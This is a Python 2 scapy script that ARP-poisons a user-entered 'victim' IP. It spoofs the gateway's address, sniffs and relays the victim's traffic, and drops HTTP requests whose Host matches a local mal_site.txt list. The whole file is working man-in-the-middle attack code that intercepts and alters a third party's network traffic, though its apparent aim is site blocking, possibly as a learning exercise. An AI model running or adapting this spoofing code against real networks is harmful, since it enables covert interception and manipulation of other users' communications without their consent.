#coding: utf-8
import os
import logging
import binascii
import re
import sys
import threading
import time
logging.getLogger("scapy.runtime").setLevel(logging.ERROR)	# Delete scapy logging
from scapy.all import *

myMAC = 0
victimMAC = 0
myIP = 0
victimIP = 0
gatewayIP = 0
gatewayMAC = 0
mal_site = ""

def open_list():
	f = open("mal_site.txt", "r")
	mal_site = f.read()
	f.close()
	return mal_site

def http_parse(data):
	global mal_site
	str_url = ""
	h = re.search("Host: (?P<url>.+)", data)
	if h:
		if h.group("url"):
			str_url = h.group("url")
			str_url = str_url[:len(str_url)-1]
			if str_url in mal_site:
				return str_url
	return ""

class arp_poison(threading.Thread):

	def run(self):
		global myMAC, victimMAC, myIP, victimIP, gatewayIP, gatewayMAC
		while(True):
				# Malicious ARP packet send			
			sendp(Ether(dst=victimMAC, src=myMAC)/ARP(op=ARP.is_at, psrc=gatewayIP, pdst=victimIP, hwsrc=myMAC, hwdst=victimMAC), count=3, verbose=False)
#			sendp(Ether(dst=gatewayMAC, src=myMAC)/ARP(op=ARP.is_at, psrc=victimIP, pdst=gatewayIP, hwsrc=myMAC, hwdst=gatewayMAC), count=3)
			time.sleep(1)

def relay(packet):
	global myMAC, victimMAC, myIP, victimIP, gatewayIP, gatewayMAC, mal_site
	mal_state = False
	if packet.haslayer(IP):
		if packet.haslayer(TCP):
			del packet[TCP].chksum
			if packet.haslayer(Raw):
				payload = packet[TCP].load
				if payload:
					url = http_parse(payload)
					if url != "":
						if url in mal_site :
							print "Mal_site detected! : " + str(url)
							mal_state = True
		elif packet.haslayer(UDP):
			del packet[UDP].chksum
			del packet[UDP].len
		del packet.chksum
		del packet.len

		if (packet[Ether].src == victimMAC) and (mal_state == False):
			if packet.haslayer(IP):
				packet[Ether].src = victimMAC
				packet[Ether].dst = gatewayMAC
				packet[IP].src = victimIP
				frags=fragment(packet,fragsize=1024)
				for frag in frags:
					sendp(frag, verbose=False)
	elif (mal_state == False):
		packet[Ether].src = victimMAC
		sendp(packet, verbose=False)

class to_gateway(threading.Thread):
	def run(self):
		while(True):
			sniff(prn=relay, store=0)

def main():
	global myMAC, victimMAC, myIP, victimIP, gatewayIP, gatewayMAC, mal_site
	victimIP = raw_input("[*] Please enter the victim's IP >> ")
	ok = re.findall("([0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3})", victimIP)		# VictimIP validation check
	if not(ok):
		print "Error occured! Invalid IP format."	
		sys.exit(1)

	gatewayIP = os.popen("route -n | awk '/0.0.0.0/ { print $2 }' | grep -v \"0.0.0.0\"").read().replace('\n','')	# GatewayIP parsing
	myIP = os.popen("ifconfig eth0 | awk '/inet addr:/ { print $2 }'").read()[5:].replace('\n','')		# HostIP parsing
	myMAC = os.popen("ifconfig eth0 | awk '/HWaddr/ { print $5 }'").read().replace('\n','')		# HostMAC parsing
	broadcast = 'ff:ff:ff:ff:ff:ff'
	broadcast2 = '00:00:00:00:00:00'
	arp_stat = os.popen("arp -a").read()		# arp table read

	victimMAC = ""
	temp = ""
	ok = re.findall("\("+str(victimIP)+"\) at ([0-9a-f]{2}\:[0-9a-f]{2}\:[0-9a-f]{2}\:[0-9a-f]{2}\:[0-9a-f]{2}\:[0-9a-f]{2}) \[ether\]", arp_stat)	# ARP table MAC address parsing
	gatewayMAC = re.findall("\("+str(gatewayIP)+"\) at ([0-9a-f]{2}\:[0-9a-f]{2}\:[0-9a-f]{2}\:[0-9a-f]{2}\:[0-9a-f]{2}\:[0-9a-f]{2}) \[ether\]", arp_stat)

	if gatewayMAC:
		gatewayMAC = gatewayMAC[0]

	else:
		print "Can't get gatewayMAC."
		sys.exit(1)

	if ok:
		victimMAC = ok[0]	# If exist

	else:
		try:
			arp_packet = Ether(dst=broadcast, src=myMAC, type=2054)/ARP(op=ARP.who_has, psrc=myIP, pdst=victimIP, hwsrc=myMAC, hwdst=broadcast2, ptype=2048, hwtype=1, hwlen=6, plen=4)
			p = srp(arp_packet, verbose=False)		# Broadcast ARP packet to victimIP
			if p:
				victimMAC = p[0][0][1].src	# victimMAC allocation
		except Exception as e:
			print "Error occured! Can't load the victimMAC. : " + str(e)
			sys.exit(1)

	print "myMAC : " + str(myMAC) + "\t\tmyIP : " + str(myIP)
	print "victimMAC : " + str(victimMAC) + "\t\tvictimIP : " + str(victimIP)
	print "gatewayMAC : " + str(gatewayMAC) + "\t\tgatewayIP : " + str(gatewayIP)
	
	mal_site = open_list()
	
	tArp = arp_poison()
	tGateway = to_gateway()

	tArp.start()
	time.sleep(1)
	tGateway.start()

	tArp.join()
	tGateway.join()

	while True:
		time.sleep(1000)

if __name__ == '__main__':
	main()
